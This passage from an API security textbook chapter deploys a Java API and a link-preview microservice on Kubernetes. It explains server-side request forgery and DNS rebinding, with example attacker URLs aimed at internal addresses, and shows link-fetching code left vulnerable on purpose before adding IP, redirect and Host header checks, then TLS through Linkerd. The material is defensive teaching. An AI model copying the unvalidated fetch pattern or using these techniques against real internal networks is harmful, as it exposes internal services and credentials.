app: natter-api          replicas: 1   template:     metadata:       labels:         app: natter-api          spec:       securityContext:         runAsNonRoot: true       containers:         - name: natter-api           image: apisecurityinaction natter-api:latest                imagePullPolicy: Never           securityContext:             allowPrivilegeEscalation: false             readOnlyRootFilesystem: true             capabilities:               drop:                 - all           ports:             - containerPort: 4567      Expose the  port that the  server runs on.  Run the following command to deploy the code:  kubectl apply -f kubernetes natter-api-deployment.yaml  Use the Docker  image that you  built with Jib.  The API server will start and connect to the database service.   The last step is to also expose the API as a service within Kubernetes so that you can connect to it. For the database service, you didn’t specify a service type so Kuber- netes deployed it using the default ClusterIP type. Such services are only accessible within the cluster, but you want the API to be accessible from external clients, so you need to pick a different service type. The simplest alternative is the NodePort service type, which exposes the service on a port on each node in the cluster. You can then connect to the service using the external IP address of any node in the cluster.    Use the nodePort attribute to specify which port the service is exposed on, or leave it  blank  to  let  the  cluster  pick  a  free  port.  The  exposed  port  must  be  in  the  range 30000–32767. In section 10.4, you’ll deploy an ingress controller for a more controlled   Deploying Natter on Kubernetes  353  approach  to  allowing  connections  from  external  clients.  Create  a  new  file  named natter-api-service.yaml in the kubernetes folder with the contents of listing 10.8.   Listing 10.8 Exposing the API as a service  apiVersion: v1 kind: Service metadata:   name: natter-api-service   namespace: natter-api spec:   type: NodePort             selector:     app: natter-api   ports:     - protocol: TCP       port: 4567       nodePort: 30567      Specify the type as  NodePort to allow  external connections.  Specify the port to expose on  each node; it must be in the  range 30000–32767.  Now run the command kubectl apply -f kubernetes natter-api-service.yaml to start the service. You can then run the following to get a URL that you can use with curl to interact with the service:  $ minikube service --url natter-api-service --namespace=natter-api  This will produce output like the following:  http:  192.168.99.109:30567  You can then use that URL to access the API as in the following example:  $ curl -X POST -H 'Content-Type: application json' \   -d '{"username":"test","password":"password"}' \   http:  192.168.99.109:30567 users {"username":"test"}  You now have the API running in Kubernetes.  10.2.4 The link-preview microservice  You have Docker images for the Natter API and the H2 database deployed and run- ning in Kubernetes, so it’s now time to develop the link-preview microservice. To sim- plify  development,  you  can  create  the  new  microservice  within  the  existing  Maven project and reuse the existing classes.  NOTE The implementation in this chapter is extremely naïve from a perfor- mance  and  scalability  perspective  and  is  intended  only  to  demonstrate  API security techniques within Kubernetes.  To implement the service, you can use the jsoup library  https:  jsoup.org  for Java, which simplifies fetching and parsing HTML pages. To include jsoup in the project,   354  CHAPTER 10 Microservice APIs in Kubernetes  open the pom.xml file in your editor and add the following lines to the <dependen- cies> section:               org.jsoup         jsoup         1.13.1         An implementation of the microservice is shown in listing 10.9. The API exposes a sin- gle operation, implemented as a GET request to the  preview endpoint with the URL from the link as a query parameter. You can use jsoup to fetch the URL and parse the HTML that is returned. Jsoup does a good job of ensuring the URL is a valid HTTP or HTTPS URL, so you can skip performing those checks yourself and instead register Spark exception handlers to return an appropriate response if the URL is invalid or cannot be fetched for any reason.  WARNING If you process URLs in this way, you should ensure that an attacker can’t submit file:   URLs and use this to access protected files on the API server disk. Jsoup strictly validates that the URL scheme is HTTP before load- ing any resources, but if you use a different library you should check the doc- umentation or perform your own validation.  After  jsoup  fetches  the  HTML  page,  you  can  use  the  selectFirst  method  to  find metadata tags in the document. In this case, you’re interested in the following tags:   The document title.  The Open Graph description property, if it exists. This is represented in the  HTML as a   tag with the property attribute set to og:description.   The  Open  Graph  image  property,  which  will  provide  a  link  to  a  thumbnail  image to accompany the preview.  You can also use the doc.location   method to find the URL that the document was finally  fetched  from  just  in  case  any  redirects  occurred.  Navigate  to  the  src main  java com manning apisecurityinaction  folder  and  create  a  new  file  named  Link- Previewer.java. Copy the contents of listing 10.9 into the file and save it.  WARNING This implementation is vulnerable to server-side request forgery  SSRF  attacks. You’ll mitigate these issues in section 10.2.7.

You can reuse the existing jib-maven-plugin the build the   356  CHAPTER 10 Microservice APIs in Kubernetes  Docker  image,  overriding  the  image  name  and  main  class  on  the  command  line. Open a terminal in the root folder of the Natter API project and run the following commands to build the image to the Minikube Docker daemon. First, ensure the envi- ronment is configured correctly by running:  eval $ minikube docker-env   Then use Jib to build the image for the link-preview service:  mvn clean compile jib:dockerBuild \   -Djib.to.image=apisecurityinaction link-preview \   -Djib.container.mainClass=com.manning.apisecurityinaction. ➥ LinkPreviewer  You can then deploy the service to Kubernetes by applying a deployment configura- tion, as shown in listing 10.10. This is a copy of the deployment configuration used for the main Natter API,  with the pod names changed and updated to use the Docker image  that  you  just  built.  Create  a  new  file  named  kubernetes natter-link-preview- deployment.yaml using the contents of listing 10.10.   Listing 10.10 The link-preview service deployment  Give the pods the  name link-preview- service.  apiVersion: apps v1 kind: Deployment metadata:   name: link-preview-service-deployment   namespace: natter-api spec:   selector:     matchLabels:       app: link-preview-service         replicas: 1   template:     metadata:       labels:         app: link-preview-service         spec:       securityContext:         runAsNonRoot: true       containers:         - name: link-preview-service           image: apisecurityinaction link-preview-service:latest               imagePullPolicy: Never           securityContext:             allowPrivilegeEscalation: false             readOnlyRootFilesystem: true             capabilities:               drop:                 - all           ports:             - containerPort: 4567  Use the link- preview-service Docker image you just built.   Deploying Natter on Kubernetes  357  Run the following command to create the new deployment:  kubectl apply -f \   kubernetes natter-link-preview-deployment.yaml  To allow the Natter API to locate the new service, you should also create a new Kuber- netes service configuration for it. Listing 10.11 shows the configuration for the new service, selecting the pods you just created and exposing port 4567 to allow access to the API. Create the file kubernetes natter-link-preview-service.yaml with the contents of the new listing.   Listing 10.11 The link-preview service configuration  apiVersion: v1 kind: Service metadata:   name: natter-link-preview-service        namespace: natter-api spec:   selector:     app: link-preview         ports:     - protocol: TCP           port: 4567         Expose port 4567 that  the API will run on.  Give the service  a name.  Make sure to use the matching  label for the deployment pods.  Run the following command to expose the service within the cluster:  kubectl apply -f kubernetes natter-link-preview-service.yaml  10.2.6 Calling the link-preview microservice  The ideal place to call the link-preview service is when a message is initially posted to the Natter API. The preview data can then be stored in the database along with the message and served up to all users. For simplicity, you can instead call the service when reading a message. This is very inefficient because the preview will be regenerated every time the message is read, but it is convenient for the purpose of demonstration.   The code to call the link-preview microservice is shown in listing 10.12. Open the  SpaceController.java file and add the following imports to the top:  import java.net.*; import java.net.http.*; import java.net.http.HttpResponse.BodyHandlers; import java.nio.charset.StandardCharsets; import java.util.*; import java.util.regex.Pattern;  Then add the fields and new method defined in the listing. The new method takes a link, extracted from a message, and calls the link-preview service passing the link URL  as  a  query  parameter.  If  the  response  is  successful,  then  it  returns  the  link- preview JSON.   358  CHAPTER 10 Microservice APIs in Kubernetes  Listing 10.12 Fetching a link preview  Construct a HttpClient and a constant for the microservice URI.    private final HttpClient httpClient = HttpClient.newHttpClient  ;      private final URI linkPreviewService = URI.create                              "http:  natter-link-preview-service:4567" ;                     private JSONObject fetchLinkPreview String link  {       var url = linkPreviewService.resolve " preview?url=" +                     URLEncoder.encode link, StandardCharsets.UTF_8  ;          var request = HttpRequest.newBuilder url                                   .GET                                                               .build  ;                                                  try {           var response = httpClient.send request,                   BodyHandlers.ofString   ;           if  response.statusCode   == 200  {                      return new JSONObject response.body   ;              }       } catch  Exception ignored  { }       return null;   }  If the response is  successful, then return  the JSON link preview.  Create a GET  request to the  service, passing  the link as the url  query parameter.  To return the links from the Natter API, you need to update the Message class used to represent a message read from the database. In the SpaceController.java file, find the Message class definition and update it to add a new links field containing a list of link previews, as shown in listing 10.13.  TIP If  you  haven’t  added  support  for  reading  messages  to  the  Natter  API, you  can  download  a  fully  implemented  API  from  the  GitHub  repository accompanying the book: https:  github.com NeilMadden apisecurityinaction. Check out the chapter10 branch for a starting point, or chapter10-end for the completed code.  Listing 10.13 Adding links to a message    public static class Message {     private final long spaceId;     private final long msgId;     private final String author;     private final Instant time;     private final String message;     private final List  links = new ArrayList   ;     Add a list of  link previews  to the class.      public Message long spaceId, long msgId, String author,         Instant time, String message  {       this.spaceId = spaceId;       this.msgId = msgId;       this.author = author;       this.time = time;       this.message = message;     }   Deploying Natter on Kubernetes  359      @Override     public String toString   {       JSONObject msg = new JSONObject  ;       msg.put "uri",           " spaces " + spaceId + " messages " + msgId ;       msg.put "author", author ;       msg.put "time", time.toString   ;       msg.put "message", message ;       msg.put "links", links ;               return msg.toString  ;     }   }  Return the links as  a new field on the  message response.  Finally, you can update the readMessage method to scan the text of a message for strings that look like URLs and fetch a link preview for those links. You can use a regular expression to search for potential links in the message. In this case, you’ll just look for any strings that start with http:    or https:   , as shown in listing 10.14. Once a potential link has been found, you can use the fetchLinkPreview method you  just  wrote  to  fetch  the  link  preview.  If  the  link  was  valid  and  a  preview  was returned, then add the preview to the list of links on the message. Update the read- Message  method  in  the  SpaceController.java  file  to  match  listing  10.14.  The  new code is highlighted in bold.  Listing 10.14 Scanning messages for links    public Message readMessage Request request, Response response  {     var spaceId = Long.parseLong request.params ":spaceId"  ;     var msgId = Long.parseLong request.params ":msgId"  ;      var message = database.findUnique Message.class,         "SELECT space_id, msg_id, author, msg_time, msg_text " +             "FROM messages WHERE msg_id = ?

If it was valid, then add  the link preview to the  links list in the message.  Use a regular  expression to find  links in the message.      response.status 200 ;     return message;   }   360  CHAPTER 10 Microservice APIs in Kubernetes  You can now rebuild the Docker image by running the following command in a termi- nal  in the root folder of  the project   make sure to  set up the  Docker  environment again if this is a new terminal window :  mvn clean compile jib:dockerBuild  Because the image is not  versioned, Minikube  won’t automatically pick up the new image. The simplest way to use the new image is to restart Minikube, which will reload all the images from the Docker daemon:1  minikube stop  and then  minikube start  You can now try out the link-preview service. Use the minikube ip command to get the IP address to use to connect to the service. First create a user:  curl http:  $ minikube ip :30567 users \   -H 'Content-Type: application json' \   -d '{"username":"test","password":"password"}'  Next, create a social space and extract the message read-write capability URI into a variable:  MSGS_URI=$ curl http:  $ minikube ip :30567 spaces \   -H 'Content-Type: application json' \   -d '{"owner":"test","name":"test space"}' \   -u test:password  jq -r '."messages-rw"'   You can now create a message with a link to a HTML story in it:  MSG_LINK=$ curl http:  $ minikube ip :30567$MSGS_URI \   -u test:password \   -H 'Content-Type: application json' \   -d '{"author":"test", "message":"Check out this link: ➥  http:  www.bbc.co.uk news uk-scotland-50435811"}'  jq -r .uri   Finally, you can retrieve the message to see the link preview:  curl -u test:password http:  $ minikube ip :30567$MSG_LINK  jq  The output will look like the following:  {   "author": "test",   "links": [  1 Restarting  Minikube  will  also  delete  the  contents  of  the  database  as  it  is  still  purely  in-memory.

This  opens  the  application  up  to  a  server-side  request  forgery   SSRF   attack, where an attacker crafts a link that refers to an internal service that isn’t accessible from outside the network, as shown in figure 10.4.  DEFINITION A server-side request forgery attack occurs when an attacker can sub- mit URLs to an API that are then loaded from inside a trusted network. By submitting URLs that refer to internal IP addresses the attacker may be able to discover  what  services  are  running inside the network or  even to cause side effects.  SSRF attacks can be devastating in some cases. For example, in July 2019, Capital One, a large financial services company, announced a data breach that compromised user details, Social Security numbers, and bank account numbers  http:  mng.bz 6AmD . Analysis  of  the  attack   https:  ejj.io blog capital-one   showed  that  the  attacker exploited  a  SSRF  vulnerability  in  a  Web  Application  Firewall  to  extract  credentials from the AWS metadata service, which is exposed as a simple HTTP server available on the local network. These credentials were then used to access secure storage buck- ets containing the user data.   Although the AWS metadata service was attacked in this case, it is far from the first service to assume that requests from within an internal network are safe. This used to be  a  common  assumption for applications installed  inside  a corporate  firewall,  and you can still find applications that will respond with sensitive data to completely unau- thenticated HTTP requests. Even critical elements of the Kubernetes control plane, such as the etcd database used to store cluster configuration and service credentials, can sometimes be accessed via unauthenticated HTTP requests  although this is usu- ally disabled . The best defense against SSRF attacks is to require authentication for   362  CHAPTER 10 Microservice APIs in Kubernetes  In an SSRF attack, an attacker outside the ﬁrewall makes a request with a URL of an internal service.  The API doesn’t validate the URL and so makes a request to the internal service.  Firewall  url=http:  192.168.0.1 admin  Link-preview API  GET admin  Target service IP: 192.168.0.1  SSRF can be used to steal credentials, scan internal networks, or even directly call APIs.  Figure 10.4 In an SSRF attack, the attacker sends a URL to a vulnerable API  that refers to an internal service. If the API doesn’t validate the URL, it will make  a request to the internal service that the attacker couldn’t make themselves.  This may allow the attacker to probe internal services for vulnerabilities, steal  credentials returned from these endpoints, or directly cause actions via  vulnerable APIs.  access to any internal services, regardless of whether the request originated from an internal network: an approach known as zero trust networking.  DEFINITION A  zero  trust  network  architecture  is  one  in  which  requests  to  ser- vices  are  not  trusted  purely  because  they  come  from  an  internal  network. Instead,  all  API  requests  should  be  actively  authenticated  using  techniques such  as  those  described  in  this  book.  The  term  originated  with  Forrester Research and was popularized by Google’s BeyondCorp enterprise architec- ture  https:  cloud.google.com beyondcorp  . The term has now become a marketing  buzzword,  with  many  products  promising  a  zero-trust  approach, but the core idea is still valuable.  Although  implementing  a  zero-trust  approach  throughout  an  organization  is  ideal, this can’t always be relied upon, and a service such as the link-preview microservice shouldn’t assume that all requests are safe. To prevent the link-preview service being   Deploying Natter on Kubernetes  363  abused for SSRF attacks, you should validate URLs passed to the service before mak- ing a HTTP request. This validation can be done in two ways:   You can check the URLs against a set of allowed hostnames, domain names, or  ideally  strictly match the entire URL. Only URLs that match the allowlist are allowed. This approach is the most secure but is not always feasible.    You  can block  URLs  that  are  likely  to  be  internal  services  that  should  be  pro- tected. This is less secure than allowlisting for several reasons. First, you may for- get to blocklist some services. Second, new services may be added later without the blocklist being updated. Blocklisting should only be used when allowlisting is not an option.  For  the  link-preview  microservice,  there  are  too  many  legitimate  websites  to  have  a hope of listing them all, so you’ll fall back on a form of blocklisting: extract the host- name from the URL and then check that the IP address does not resolve to a private IP address. There are several classes of IP addresses that are never valid targets for a link-preview service:   Any loopback address, such as 127.0.0.1, which always refers to the local machine. Allowing requests to these addresses might allow access to other containers run- ning in the same pod.   Any  link-local  IP  address,  which  are  those  starting  169.254  in  IPv4  or  fe80  in IPv6. These addresses are reserved for communicating with hosts on the same network segment.   Private-use IP address ranges, such as 10.x.x.x or 169.198.x.x in IPv4, or site-local IPv6 addresses  starting fec0 but now deprecated , or IPv6 unique local addresses  starting  fd00 .  Nodes  and  pods  within  a  Kubernetes  network  will  normally have a private-use IPv4 address, but this can be changed.   Addresses that are not valid for use with HTTP, such as multicast addresses or  the wildcard address 0.0.0.0.  Listing 10.15 shows how to check for URLs that resolve to local or private IP addresses using  Java’s  java.net.InetAddress  class.  This  class  can  handle  both  IPv4  and  IPv6 addresses and provides helper methods to check for most of the types of IP address listed previously. The only check it doesn’t do is for the newer unique local addresses that were a late addition to the IPv6 standards. It is easy to check for these yourself though, by checking if the address is an instance of the Inet6Address class and if the first two bytes of the raw address are the values 0xFD and 0x00. Because the hostname in a URL may resolve to more than one IP address, you should check each address using InetAddress.getAllByName  . If any address is private-use, then the code rejects the  request.  Open  the  LinkPreviewService.java  file  and  add  the  two  new  methods from listing 10.15 to the file.          364  CHAPTER 10 Microservice APIs in Kubernetes  Listing 10.15 Checking for local IP addresses  Check if the IP address is any local- or private-use type.  private static boolean isBlockedAddress String uri          throws UnknownHostException {     var host = URI.create uri .getHost  ;                for  var ipAddr : InetAddress.getAllByName host   {             if  ipAddr.isLoopbackAddress                             ipAddr.isLinkLocalAddress                        ipAddr.isSiteLocalAddress                        ipAddr.isMulticastAddress                        ipAddr.isAnyLocalAddress                         isUniqueLocalAddress ipAddr   {                return true;                                   }     }     return false;     }  Otherwise,  return false.  Extract the hostname  from the URI.  Check all IP  addresses for  this hostname.  private static boolean isUniqueLocalAddress InetAddress ipAddr  {     return ipAddr instanceof Inet6Address &&                             ipAddr.getAddress  [0] & 0xFF  == 0xFD &&                   ipAddr.getAddress  [1] & 0xFF  == 0X00;        }  To check for IPv6 unique local addresses, check the first two bytes of the raw address.  You can now update the link-preview operation to reject requests using a URL that resolves to a local address by changing the implementation of the GET request han- dler to reject requests for which isBlockedAddress returns true. Find the definition of the GET handler in the LinkPreviewService.java file and add the check as shown below in bold:  get " preview",  request, response  -> {     var url = request.queryParams "url" ;     if  isBlockedAddress url   {         throw new IllegalArgumentException                  "URL refers to local private address" ;     }  Although this change prevents the most obvious SSRF attacks, it has some limitations:  You’re  checking  only  the  original  URL  that  was  provided  to  the  service,  but jsoup by default  will  follow  redirects.  An  attacker  can set  up  a public  website such as http:   evil.example.com, which returns a HTTP redirect to an internal address  inside  your  cluster.  Because  only  the  original  URL  is  validated   and appears to be a genuine site , jsoup will end up following the redirect and fetch- ing the internal site.   Even if you allowlist a set of known good websites, an attacker may be able to find an open redirect vulnerability on one of those sites that allows them to pull off the same trick and redirect jsoup to an internal address.   Deploying Natter on Kubernetes  365  DEFINITION An open redirect vulnerability occurs when a legitimate website can be tricked into issuing a HTTP redirect to a URL supplied by the attacker. For example, many login services  including OAuth2  accept a URL as a query parameter  and  redirect  the  user  to  that  URL  after  authentication.  Such parameters should always be strictly validated against a list of allowed URLs.  You  can  ensure  that  redirect  URLs  are  validated  for  SSRF  attacks  by  disabling  the automatic redirect handling behavior in jsoup and implementing it yourself, as shown in  listing  10.16.  By  calling  followRedirects false   the  built-in  behavior  is  pre- vented, and jsoup will return a response with a 3xx HTTP status code when a redirect occurs. You can then retrieve the redirected URL from the Location header on the response.  By  performing  the  URL  validation  inside  a  loop,  you  can  ensure  that  all redirects are validated, not just the first URL. Make sure you define a limit on the num- ber of redirects to prevent an infinite loop. When the request returns a non-redirect response,  you  can  parse  the  document  and  process  it  as  before.  Open  the  Link- Previewer.java file and add the method from listing 10.16.   Listing 10.16 Validating redirects  Loop until the URL resolves to a document.  Set a limit on the number of redirects.  private static Document fetch String url  throws IOException {     Document doc = null;     int retries = 0;     while  doc == null && retries++ < 10  {            if  isBlockedAddress url   {                                      throw new IllegalArgumentException                                    "URL refers to local private address" ;           }                                                             var res = Jsoup.connect url .followRedirects false                       .timeout 3000 .method GET .execute  ;         if  res.statusCode     100 == 3  {                             url = res.header "Location" ;                          } else {             doc = res.parse  ;               }     }     if  doc == null  throw new IOException "too many redirects" ;     return doc; }  Disable automatic redirect handling in jsoup.  Otherwise, parse the returned document.  If any URL resolves  to a private-use IP  address, then reject  the request.  If the site returns a  redirect status code   3xx in HTTP , then  update the URL.  Update the request handler to call the new method instead of call jsoup directly. In the  handler  for  GET  requests  to  the   preview  endpoint,  replace  the  line  that  cur- rently reads  var doc = Jsoup.connect url .timeout 3000 .get  ;      with the following call to the new fetch"method:  var doc = fetch url ;   366  CHAPTER 10 Microservice APIs in Kubernetes  Pop quiz 4 Which one of the following is the most secure way to validate URLs to prevent  SSRF attacks? a Only performing GET requests b Only performing HEAD requests c Blocklisting private-use IP addresses d Limiting the number of requests per second e Strictly matching the URL against an allowlist of known safe values  The answer is at the end of the chapter.  10.2.8 DNS rebinding attacks  A more sophisticated SSRF attack, which can defeat validation of redirects, is a DNS rebinding attack, in which an attacker sets up a website and configures the DNS server for the domain to a server under their control  figure 10.5 . When the validation code looks up the IP address, the DNS server returns a genuine external IP address with a very short time-to-live value to prevent the result being cached. After validation has succeeded, jsoup will perform another DNS lookup to actually connect to the website. For this second lookup, the attacker’s DNS server returns an internal IP address, and so jsoup attempts to connect to the given internal service.  DEFINITION A DNS rebinding attack occurs when an attacker sets up a fake web- site that they control the DNS for. After initially returning a correct IP address to bypass any validation steps, the attacker quickly switches the DNS settings to return the IP address of an internal service when the actual HTTP call is made.  Although it is hard to prevent DNS rebinding attacks when making an HTTP request, you can prevent such attacks against your APIs in several ways:   Strictly  validate  the  Host  header  in  the  request  to  ensure  that  it  matches  the hostname of the API being called. The Host header is set by clients based on the  URL  that  was  used  in  the  request  and  will  be  wrong  if  a  DNS  rebinding attack  occurs.  Most  web  servers  and  reverse  proxies  provide  configuration options to explicitly verify the Host header.   By using TLS for all requests. In this case, the TLS certificate presented by the target server won’t match the hostname of the original request and so the TLS authentication handshake will fail.   Many DNS servers and firewalls can also be configured to block potential DNS binding attacks for an entire network by filtering out external DNS responses that resolve to internal IP addresses.   Listing  10.17  shows  how  to  validate  the  host  header  in  Spark  Java  by  checking  it against a set of valid values. Each service can be accessed within the same namespace   Deploying Natter on Kubernetes  367  1. In a DNS rebinding attack, the  attacker sends a URL that refers to a domain under their control.  3. Because the URL validated the  API will make a request to the internal service.  Link-preview API  Target service IP: 192.168.0.1  url=http:  evil.com admin  DNS lookup: evil.com  1: Real evil.com IP address, ttl=0 2: 192.168.0.1  Attacker-  controlled DNS  2. When the API validates the URL, the attacker’s DNS server returns the correct IP address. But when it makes a second query, it returns the IP address of an internal service.  Figure 10.5 In a DNS rebinding attack, the attacker submits a URL referring  to a domain under their control. When the API performs a DNS lookup during  validation, the attacker’s DNS server returns a legitimate IP address with a  short time-to-live  ttl . Once validation has succeeded, the API performs a  second DNS lookup to make the HTTP request, and the attacker’s DNS server  returns the internal IP address, causing the API to make an SSRF request even  though it validated the URL.  using the short service name such as natter-api-service, or from other namespaces in the cluster using a name like natter-api-service.natter-api. Finally, they will also have a fully qualified name, which by default ends in .svc.cluster.local. Add this  filter  to  the  Natter  API  and  the  link-preview  microservice  to  prevent  attacks against those services. Open the Main.java file and add the contents of the listing to the main method, just after the existing rate-limiting filter you added in chapter 3. Add the same code to the LinkPreviewer class.  Listing 10.17  Validating the Host header  var expectedHostNames = Set.of                                    "api.natter.com",                                         "api.natter.com:30567",                                   "natter-link-preview-service:4567",                       "natter-link-preview-service.natter-api:4567",            "natter-link-preview-service.natter-api.svc.cluster.local:4567" ;  Define all valid  hostnames for  your API.   368  CHAPTER 10 Microservice APIs in Kubernetes  before  request, response  -> {                                if  !expectedHostNames.contains request.host     {             halt 400 ;                                             }                                                      } ;                                                         Reject any request  that doesn’t match  one of the set.  If you want to be able to call the Natter API from curl, you’ll also need to add the external Minikube IP address and port, which you can get by running the command, minikube ip. For example, on my system I needed to add  "192.168.99.116:30567"  to the allowed host values in Main.java.  TIP You can create an alias for the Minikube IP address in the  etc hosts file on Linux or MacOS by running the command sudo sh -c "echo '$ minikube ip  api.natter.local' >>  etc hosts. On Windows, create or edit the file under  C:\Windows\system32\etc\hosts  and  add  a  line  with  the  IP  address  a space  and  the  hostname.  You  can  then  make  curl  calls  to  http:   api.natter .local:30567 rather than using the IP address. 10.3 Securing microservice communications  You’ve now deployed some APIs to Kubernetes and applied some basic security con- trols to the pods themselves by adding security annotations and using minimal Docker base  images. These measures make it harder  for  an  attacker to break out  of  a con- tainer if they find a vulnerability to exploit. But even if they can’t break out from the container, they may still be able to cause a lot of damage by observing network traffic and sending their own messages on the network. For example, by observing commu- nications between the Natter API and the H2 database they can capture the connec- tion password and then use this to directly connect to the database, bypassing the API. In  this  section,  you’ll  see  how  to  enable  additional  network  protections  to  mitigate against these attacks.  10.3.1 Securing communications with TLS  In a traditional network, you can limit the ability of an attacker to sniff network com- munications  by  using  network  segmentation.  Kubernetes  clusters  are  highly  dynamic, with  pods  and  services  coming  and  going  as  configuration  changes,  but  low-level network segmentation is a more static approach that is hard to change. For this rea- son, there is usually no network segmentation of this kind within a Kubernetes cluster  although  there  might  be  between  clusters  running  on  the  same  infrastructure , allowing an attacker that gains privileged access to observe all network communica- tions  within  the  cluster  by  default.  They  can  use  credentials  discovered  from  this snooping to access other systems and increase the scope of the attack.  DEFINITION Network segmentation refers to using switches, routers, and firewalls to divide a network into separate segments  also known as collision domains . An   Securing microservice communications  369  attacker can then only observe network traffic within the same network seg- ment and not traffic in other segments.  Although  there  are  approaches  that  provide  some  of  the  benefits  of  segmentation within a cluster, a better approach is to actively protect all communications using TLS. Apart from preventing an attacker from snooping on network traffic, TLS also pro- tects against a range of attacks at the network level, such as the DNS rebind attacks mentioned in section 10.2.8. The certificate-based authentication built into TLS pro- tects against spoofing attacks such as DNS cache poisoning or ARP spoofing, which rely on the lack of authentication in low-level protocols. These attacks are prevented by fire- walls,  but  if  an  attacker  is  inside  your  network   behind  the  firewall   then  they  can often be carried out effectively. Enabling TLS inside your cluster significantly reduces the ability of an attacker to expand an attack after gaining an initial foothold.  DEFINITION In a DNS cache poisoning attack, the attacker sends a fake DNS mes- sage to a DNS server changing the IP address that a hostname resolves to. An ARP spoofing attack works at a lower level by changing the hardware address  ethernet MAC address, for example  that an IP address resolves to.  To enable TLS, you’ll need to generate certificates for each service and distribute the cer- tificates  and  private  keys  to  each  pod  that  implements  that  service.  The  processes involved in creating and distributing certificates is known as public key infrastructure  PKI .  DEFINITION A public key infrastructure is a set of procedures and processes for creating, distributing, managing, and revoking certificates used to authenti- cate TLS connections.  Running a PKI is complex and error-prone because there are a lot of tasks to consider:  Private keys and certificates have to be distributed to every service in the net-  work and kept secure.   Certificates need to be issued by a private certificate authority  CA , which itself needs to be secured. In some cases, you may want to have a hierarchy of CAs with a root CA and one or more intermediate CAs for additional security. Services which are available to the public must obtain a certificate from a public CA.   Servers  must  be  configured  to  present  a  correct  certificate  chain  and  clients  must be configured to trust your root CA.   Certificates must be revoked when a service is decommissioned or if you suspect a private key has been compromised. Certificate revocation is done by publish- ing and distributing certificate revocation lists  CRLs  or running an online certifi- cate status protocol  OCSP  service.   Certificates must be automatically renewed periodically to prevent them from expiring. Because revocation involves blocklisting a certificate until it expires, short expiry times are preferred to prevent CRLs becoming too large. Ideally, certificate renewal should be completely automated.   370  CHAPTER 10 Microservice APIs in Kubernetes  Using an intermediate CA Directly issuing certificates from the root CA trusted by all your microservices is sim- ple, but in a production environment, you’ll want to automate issuing certificates. This means that the CA needs to be an online service responding to requests for new certificates. Any online service can potentially be compromised, and if this is the root of trust for all TLS certificates in your cluster  or many clusters , then you’d have no choice in this case but to rebuild the cluster from scratch. To improve the security of your clusters, you can instead keep your root CA keys offline and only use them to periodically sign an intermediate CA certificate. This intermediate CA is then used to issue certificates to individual microservices. If the intermediate CA is ever compro- mised, you can use the root CA to revoke its certificate and issue a new one. The root CA  certificate  can  then  be  very  long-lived,  while  intermediate  CA  certificates  are changed regularly.  To get this to work, each service in the cluster must be configured to send the inter- mediate CA certificate to the client along with its own certificate, so that the client can construct a valid certificate chain from the service certificate back to the trusted root CA.  If you need to run multiple clusters, you can also use a separate intermediate CA for each cluster and use name constraints  http:  mng.bz oR8r  in the intermediate CA certificate to restrict which names it can issue certificates for  but not all clients sup- port name constraints . Sharing a common root CA allows clusters to communicate with each other easily, while the separate intermediate CAs reduce the scope if a compromise occurs.  10.3.2 Using a service mesh for TLS  In a highly dynamic environment like Kubernetes, it is not advisable to attempt to run a PKI manually. There are a variety of tools available to help run a PKI for you. For example,  Cloudflare’s  PKI  toolkit   https:  cfssl.org   and  Hashicorp  Vault   http:   mng.bz nzrg  can both be used to automate most aspects of running a PKI. These general-purpose  tools  still  require  a  significant  amount  of  effort  to  integrate  into  a Kubernetes environment. An alternative that is becoming more popular in recent years is to use a service mesh such as Istio  https:  istio.io  or Linkerd  https:  linkerd.io  to handle TLS between services in your cluster for you.  DEFINITION A service mesh is a set of components that secure communications between pods in a cluster using proxy sidecar containers. In addition to secu- rity benefits, a service mesh provides other useful functions such as load bal- ancing, monitoring, logging, and automatic request retries.  A  service  mesh  works  by  installing  lightweight  proxies  as  sidecar  containers  into every pod in your network, as shown in figure 10.6. These proxies intercept all net- work requests coming into the pod  acting as a reverse proxy  and all requests going out  of  the  pod.  Because  all  communications  flow  through  the  proxies,  they  can   Securing microservice communications  371  In a service mesh, all service communication is redirected through proxies running as sidecar containers inside each pod.

All communications are upgraded to use TLS automatically.  A CA running in the control plane distributes certiﬁcates to the proxies.

All requests to and from the other containers in the pod are redirected  through the proxy. The proxy upgrades communications to use TLS using  certificates it obtains from a CA running in the service mesh control plane.  transparently initiate and terminate TLS, ensuring that communications across the network are secure while the individual microservices use normal unencrypted mes- sages. For example, a client can make a normal HTTP request to a REST API and the client’s service mesh proxy  running inside the same pod on the same machine  will transparently upgrade this to HTTPS. The proxy at the receiver will handle the TLS connection and forward the plain HTTP request to the target service. To make this work, the service mesh runs a central CA service that distributes certificates to the  proxies.  Because  the  service  mesh  is  aware  of  Kubernetes  service  metadata,  it automatically  generates  correct  certificates  for  each  service  and  can  periodically reissue them.2   To enable a service mesh, you need to install the service mesh control plane compo- nents such as the CA into your cluster. Typically, these will run in their own Kuberne- tes  namespace.  In  many  cases,  enabling  TLS  is  then  simply  a  case  of  adding  some annotations to the deployment YAML files. The service mesh will then automatically  2 At the time of writing, most service meshes don’t support certificate revocation, so you should use short-lived  certificates and avoid relying on this as your only authentication mechanism.   372  CHAPTER 10 Microservice APIs in Kubernetes  inject  the  proxy  sidecar  container  when  your  pods  are  started  and  configure  them with TLS certificates.    In this section, you’ll install the Linkerd service mesh and enable TLS between the Natter API, its database, and the link-preview service, so that all communications are secured within the network. Linkerd has fewer features than Istio, but is much simpler to deploy and configure, which is why I’ve chosen it for the examples in this book. From a security perspective, the relative simplicity of Linkerd reduces the opportunity for vulnerabilities to be introduced into your cluster.  DEFINITION The control plane of a service mesh is the set of components respon- sible  for  configuring,  managing,  and  monitoring  the  proxies.  The  proxies themselves and the services they protect are known as the data plane.  INSTALLING LINKERD To install Linkerd, you first need to install the linkerd command-line interface  CLI , which will be used to configure and control the service mesh. If you have Homebrew installed on a Mac or Linux box, then you can simply run the following command:  brew install linkerd  On  other  platforms  it  can  be  downloaded  and  installed  from  https:  github.com  linkerd linkerd2 releases . Once you’ve installed the CLI, you can run pre-installation checks to ensure that your Kubernetes cluster is suitable for running the service mesh by running:  linkerd check --pre  If you’ve followed the instructions for installing Minikube in this chapter, then this will all succeed. You can then install the control plane components by running the fol- lowing command:  linkerd install  kubectl apply -f -  Finally, run linkerd check again  without the --pre argument  to check the progress of the installation and see when all the components are up and running. This may take a few minutes as it downloads the container images.   To enable the service mesh for the Natter namespace, edit the namespace YAML file to add the linkerd annotation, as shown in listing 10.18. This single annotation will ensure that all pods in the namespace have Linkerd sidecar proxies injected the next time they are restarted.   Listing 10.18 Enabling Linkerd  apiVersion: v1 kind: Namespace metadata:   name: natter-api   Securing microservice communications  373    labels:     